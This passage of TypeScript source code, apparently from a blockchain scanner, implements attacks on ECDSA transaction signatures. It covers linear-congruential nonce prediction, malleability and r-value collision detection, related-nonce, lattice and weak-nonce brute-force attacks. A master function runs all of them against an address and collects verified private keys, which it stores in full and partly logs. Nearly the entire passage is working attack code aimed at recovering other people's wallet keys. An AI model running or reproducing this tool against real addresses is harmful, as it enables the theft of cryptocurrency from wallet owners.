    const p1 = sorted[i], p2 = sorted[i + 1];
    const k1 = p1.k, k2 = p2.k;

    // If k2 = a·k1 + b and k3 = a·k2 + b then a = (k3-k2)(k2-k1)⁻¹ mod n
    // With only two known k values, we can only look for simple patterns:
    // a) Linear: k2 = k1 + b (b = k2 - k1, a = 1)
    // b) Multiplicative: k2 = a·k1 (b = 0, a = k2·k1⁻¹)

    const bLinear = modN(k2 - k1); // additive constant
    const aMult   = (() => { try { return modN(k2 * modInv(k1)); } catch { return null; } })();

    let predictedCount = 0;

    for (const sig of sigs) {
      if (sig.txHash === p1.sig.txHash || sig.txHash === p2.sig.txHash) continue;

      // Try linear prediction: k_next = k_prev + b for consecutive signatures
      // This is an approximation — without knowing the exact ordering we test both
      const blockGap = sig.blockNumber - p2.sig.blockNumber;
      if (blockGap <= 0 || blockGap > 10000) continue;

      const kPredLinear = modN(k2 + bLinear * BigInt(blockGap));
      const rPredLinear = scalarToR(kPredLinear);
      if (rPredLinear !== null) {
        const rHex = rPredLinear.toString(16).padStart(64, "0");
        if (rLookup.has(rHex)) {
          predictedCount++;
          const sig2 = rLookup.get(rHex)!;
          const res  = recoverAndVerify(rPredLinear, BigInt(sig2.s), BigInt(sig2.z), kPredLinear, address);
          if (res?.verified) {
            logger.warn({ address, blockGap, privKey: res.privKey.slice(0, 12) },
              "🔑 POLYNONCE LCG PATTERN CONFIRMED — additional key verified");
            findings.push({
              type:      "polynonce_pattern",
              severity:  "critical",
              address,
              txHash1:   p1.sig.txHash,
              txHash2:   sig2.txHash,
              detail:    `Polynonce LCG detected: k_{i+1} = k_i + ${bLinear.toString(16).slice(0,16)}… (linear congruential). Block gap=${blockGap}.`,
              privateKey: res.privKey,
              verified:   true,
            });
          }
        }
      }
    }

    if (predictedCount > 0) {
      logger.info({ address, predictedCount, bLinear: bLinear.toString(16).slice(0, 16) + "…" },
        "Polynonce: LCG pattern predicts multiple nonces");
    }
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// MASTER RUNNER — runs all attacks on a set of signatures
// ═══════════════════════════════════════════════════════════════════════════════

export interface AdvancedScanResult {
  address:    string;
  sigCount:   number;
  biasReport: BiasReport;
  findings:   AdvancedFinding[];
  keysFound:  string[];          // verified private keys
}

export async function runAllAdvancedAttacks(
  address: string,
  sigs:    TxSignatureData[],
  allSigsByAddress?: Map<string, TxSignatureData[]>,  // for cross-address
): Promise<AdvancedScanResult> {
  const allFindings: AdvancedFinding[] = [];

  // 3. Malleability pairs
  allFindings.push(...detectMalleabilityPairs(address, sigs));

  // 2. Exact duplicates within this address
  const selfMap = new Map([[address, sigs]]);
  allFindings.push(...detectExactDuplicates(selfMap));

  // 4. Related nonce attack
  allFindings.push(...relatedNonceAttack(address, sigs));

  // 6. Bias analysis
  const biasReport = analyzeSignatureBias(address, sigs);
  allFindings.push(...biasReport.findings);

  // 7. Lattice attack (only if bias detected)
  if (biasReport.shouldTriggerLattice) {
    allFindings.push(...latticeAttack(address, sigs, biasReport));
  }

  // 5. Weak k brute force (run for small-r addresses or always)
  if (biasReport.smallRCount > 0 || sigs.length <= 1000) {
    allFindings.push(...weakKBruteForce(address, sigs));
  }

  // Cross-address (if global map provided)
  if (allSigsByAddress && allSigsByAddress.size > 1) {
    allFindings.push(...detectCrossAddressRCollisions(allSigsByAddress));
  }

  const keysFound = [...new Set(
    allFindings.filter(f => f.privateKey && f.verified).map(f => f.privateKey!)
  )];

  if (allFindings.length > 0) {
    logger.info({ address, total: allFindings.length, keys: keysFound.length },
      "Advanced attack scan complete");
  }

  return { address, sigCount: sigs.length, biasReport, findings: allFindings, keysFound };
}
